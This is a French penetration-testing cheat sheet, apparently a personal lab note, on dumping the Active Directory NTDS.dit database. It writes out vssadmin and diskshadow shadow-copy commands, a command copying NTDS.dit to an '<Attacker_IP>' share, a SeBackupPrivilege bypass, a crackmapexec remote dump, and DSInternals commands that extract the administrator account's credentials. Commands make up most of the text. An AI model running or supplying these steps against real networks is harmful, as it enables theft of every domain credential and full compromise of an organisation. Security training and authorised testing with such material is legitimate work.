---
public: true
---
## Dump d'NTDS.dit
### Localement

#### Cliché instantané (vssadmin)

##### Créer une Shadow Copy (cliché instantanné) du disque C

La base NTDS.dit est par défaut stockée dans `C:\Windows\NTDS`

```
vssadmin CREATE SHADOW /For=C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

##### Copier à partir du cliché instantanné

```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit \\<Attacker_IP>\share\
```

#### Cliché instantanné (diskshadow.exe)

##### Créer une Shadow Copy (cliché instantanné) du disque C

```shell
diskshadow.exe
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```

##### Copier à partir du cliché instantanné

**Remarque** :  Si le fichier n'est pas accessible et que l'on est membre du groupe *Backup Operator*, on pourra y accéder via le privilège **SeBackupPrivilege** (voir [[Privilèges Windows Exploitables]])

```
# Ce cmdlet est lié à un outil référencé dans le lien ci-dessus
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

### A distance

```
crackmapexec smb $TARGET_IP -u $AD_USER -p $AD_PASSWORD --ntds
```

## Extraction des informations d'identification (credentials)

## Localement
### Extraction des informations présentes dans NTDS.dit

```powershell-session
# https://github.com/MichaelGrafnetter/DSInternals/releases/download/v4.12/DSInternals_v4.12.zip
PS C:\htb> Import-Module .\DSInternals.psd1
PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key


```

### A distance